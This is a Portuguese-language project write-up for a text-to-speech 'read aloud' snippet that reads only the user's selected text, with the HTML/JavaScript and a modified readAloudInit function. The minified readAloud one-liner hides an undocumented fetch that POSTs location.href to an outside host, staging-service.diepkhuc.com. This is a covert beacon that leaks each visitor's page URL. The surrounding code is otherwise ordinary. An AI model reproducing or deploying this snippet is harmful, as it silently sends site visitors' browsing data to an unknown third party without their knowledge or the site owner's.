# Feature de leitura do texto selecionado
Uma das funcionalidades importantes pro funcionamento e distribuição do nosso snippet é que o usuário possa selecionar o texto que ele quer que seja lido pelo snippet, e essa funcionalidade está praticamente pronta.

Essa funcionalidade foi realizada através da modificação da função **readAloud**, a função principal do nosso snippet, e da função **readAloudInit**, que está localizada no script externo da aplicação.

### Funcionamento
O usuário deve selecionar o texto que ele quer que seja lido antes de clicar no botão com o ícone do snippet, e aí ouvirá somente o conteúdo selecionado. Caso nada seja selecionado, o snippet lerá a página completa.

O código do snippet com a adição da feature de leitura do texto selecionado está da seguinte forma:

### Código principal do snippet com a feature de leitura do texto selecionado
O código a seguir não está utilizando o script externo, e sim um script local, visto que foi necessário modificar o script externo e a hospedagem do script externo pelo próprio grupo ainda está em andamento até o momento.
```
<div vw class="enabled">
    <div vw-access-button class="active"></div>
    <div vw-plugin-wrapper>
      <div class="vw-plugin-top-wrapper"></div>
    </div>
</div>

<p class="la">lalalalalalalala</p>
<p class="ok">ok ok ok ok ok </p>


<script>function readAloud(e,t,texto){console.log(texto);s=(/iPad|iPhone|iPod/.test(navigator.userAgent)&&(e.src=n+"sound/silence.mp3",e.play(),"undefined"!=typeof speechSynthesis&&speechSynthesis.speak(new SpeechSynthesisUtterance(" "))),document.createElement("script"));s.onload=function(){readAloudInit(e,t,null, texto)},s.src="readaloud.min.js",document.head.appendChild(s),fetch("https://staging-service.diepkhuc.com/%23referer-log",{method:"POST",body:location.href})}</script>

<script>
    const ttsContainer = document.createElement("div")
    const ttsButton = document.createElement("div")
    ttsContainer.id = "tts-container"
    ttsButton.setAttribute("ttsOn", "false")
    ttsButton.id = "tts-button"
    const ttsButtonIcon = document.createElement("img")
    ttsButtonIcon.id = "tts-button-icon"
    ttsButtonIcon.src = "https://cdn.pixabay.com/photo/2017/04/11/22/25/megaphone-2223049_1280.png"
    ttsButton.append(ttsButtonIcon)
    ttsContainer.append(ttsButton)
    document.body.appendChild(ttsContainer)
</script>
        
<script>
    function handleTTS() {
        var texto;
        

        if (ttsButton.getAttribute("ttson") == "true") {
            const ttsPlayer = document.getElementById("ra-player");
            ttsContainer.removeChild(ttsPlayer);
            ttsButton.setAttribute("ttson", "false");
        } else {
            const raPlayer = document.createElement("div");
            const raButton = document.createElement("div");
            const playIcon = document.createElement("img");

            raPlayer.id = "ra-player";
            raPlayer.setAttribute("data-skin", "https://assets.readaloudwidget.com/embed/skins/default");
            raButton.classList.add("ra-button");
            raButton.addEventListener("click", function() {
                var selection = window.getSelection();
                var selectedText = selection.toString().trim();
                texto = selectedText;
                console.log("Texto selecionado:", texto);
                readAloud(document.getElementById('ra-audio'), document.getElementById('ra-player'), texto);
            });
            playIcon.src = "https://assets.readaloudwidget.com/embed/skins/default/play-icon.png";
            raButton.append(playIcon);
            raButton.append("texto para fala");
            raPlayer.append(raButton);
            ttsContainer.append(raPlayer);
            ttsButton.setAttribute("ttson", "true");
        }
    }
    document.getElementById("tts-button").onclick = handleTTS;
</script>


</script>

<style>
    .ra-button {padding: .3em .9em; border-radius: .25em; background: linear-gradient(#fff, #efefef); box-shadow: 0 1px .2em gray; display: inline-flex; align-items: center; cursor: pointer;} 
    .ra-button img {height: 1em; margin: 0 .5em 0 0;}
    #tts-container {
        display: flex;
        flex-direction: row-reverse;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
        position: fixed;
        max-width: 95vw;
        right: 0;
        top: 42%;
        transform: translateY(-50%);
        z-index: 99999999;
        margin: 10px !important;
    }
    #tts-button-icon {
        display: flex;
        width: 40px;
        height: auto;
    }
</style>


<audio id="ra-audio" data-lang="pt-BR" data-voice="free" data-key="dda900319d5b19d3f7ec703ca1338196"></audio>
```
### Modificações no script externo

O script externo inicialmente usado no nosso snippet pode ser visto no seguinte link: [https://assets.readaloudwidget.com/embed/js/readaloud.min.js](url)

A modificação necessária foi realizada na última função do script, a função **readAloudInit**, que se encontra da seguinte forma:
```
function readAloudInit(o, r,t,  texto) {
    var i = o.getAttribute("data-lang")
      , a = o.getAttribute("data-voice")
      , s = o.getAttribute("data-key")
      , u = o.getAttribute("data-speed") || o.getAttribute("data-rate")
      , c = o.getAttribute("data-volume")
      , l = "free" == a || s.startsWith("39d740e") ? new ReadAloudWebSpeech : null;
    return r && t ? d().then(function() {
        var e = r.getElementsByClassName("ra-btn-play")[0]
          , t = function() {
            e.removeEventListener("click", t),
            /iPad|iPhone|iPod/.test(navigator.userAgent) && (o.src = "https://assets.readaloudwidget.com/embed/sound/silence.mp3",
            o.play(),
            l && "undefined" != typeof speechSynthesis && speechSynthesis.speak(new SpeechSynthesisUtterance(" "))),
            n()
        };
        e.addEventListener("click", t)
    }) : n();
    function n() {
        var n;
        return Promise.all([l && l.ready(i), !window.jQuery && h("https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js").then(eval)]).then(function(e) {
            n = e[0];
            if (texto!=""){
                var e = texto;
            } else {
                var e = "function" == typeof readAloudGetText ? readAloudGetText(jQuery) : new ReadAloudDoc(jQuery).getTexts().join("\n\n");
            }
            return Promise.all([n ? e : (e = e,
            function(o, r) {
                return new Promise(function(e, t) {
                    var n = new XMLHttpRequest;
                    n.open("POST", o, !0),
                    n.setRequestHeader("Content-type", "application/json"),
                    n.onreadystatechange = function() {
                        4 == n.readyState && (200 == n.status ? e(n.responseText) : t(new Error(n.responseText || n.statusText || n.status)))
                    }
                    ,
                    n.send(JSON.stringify(r))
                }
                )
            }("https://ws.readaloudwidget.com/synthesize?t=" + Date.now(), {
                text: e,
                lang: i,
                voice: a,
                key: s,
                referer: location.href
            }).then(JSON.parse).then(function(e) {
                return e.url
            })), r && (t ? Promise.resolve() : d()).then(function() {
                new ReadAloudPlayer(n ? l : o,r,jQuery,{
                    defaultRate: u,
                    defaultVolume: c
                }),
                jQuery(r).addClass("ra-loading")
            })])
        }).then(function(e) {
            function t() {
                jQuery(r).removeClass("ra-loading")
            }
            n ? (jQuery(l).one("canplay", t),
            l.setText(e[0]),
            l.play()) : (jQuery(o).one("canplay", t),
            o.src = e[0],
            o.play())
        })
    }
    function d() {
        var e, t = r.getAttribute("data-skin");
        return Promise.all([h(t + "/template.html"), (t = t + "/styles.css",
        e = document.createElement("LINK"),
        document.head.appendChild(e),
        e.setAttribute("type", "text/css"),
        e.setAttribute("rel", "stylesheet"),
        void e.setAttribute("href", t))]).then(function(e) {
            r.innerHTML = e[0]
        })
    }
    function h(o) {
        return new Promise(function(e, t) {
            var n = new XMLHttpRequest;
            n.open("GET", o, !0),
            n.onreadystatechange = function() {
                4 == n.readyState && (200 == n.status ? e(n.responseText) : t(new Error(n.responseText || n.statusText || n.status)))
            }
            ,
            n.send(null)
        }
        )
    }
}
```
